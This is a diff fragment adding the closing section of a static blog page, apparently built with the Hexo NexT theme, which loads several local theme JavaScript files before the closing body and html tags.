+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
